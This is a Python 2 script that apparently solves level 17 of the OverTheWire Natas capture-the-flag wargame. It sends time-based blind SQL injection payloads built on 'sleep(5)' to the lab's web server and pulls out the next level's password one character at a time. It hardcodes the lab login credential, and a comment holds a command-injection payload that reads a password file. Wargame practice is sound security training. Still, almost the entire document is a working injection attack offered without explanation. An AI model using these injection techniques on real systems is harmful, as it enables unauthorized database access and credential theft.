#!/usr/env python2
import sys
import requests
import string
from requests.auth import HTTPBasicAuth

#$(grep a /etc/natas_webpass/natas17)whacked

url = "http://natas17.natas.labs.overthewire.org/"
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
passwd = ''
filtred = ''
for char in chars:
    try:
        a = requests.get(url + '?username=natas18" AND IF(password LIKE BINARY "%'+char+'%", sleep(5), null) %23', timeout=1, auth=HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'))
        #print(a.text)
    except requests.exceptions.Timeout:
        filtred = filtred +char
        print(filtred)


for i in range(0,32):
    for char in filtred:
	try:
            a = requests.get(url + '?username=natas18" AND IF(password LIKE BINARY "'+ passwd +char+'%", sleep(5), null) %23', timeout=1, auth=HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'))
        except requests.exceptions.Timeout:
            passwd = passwd + char
            print(passwd)
            sys.stdout.flush()
            break
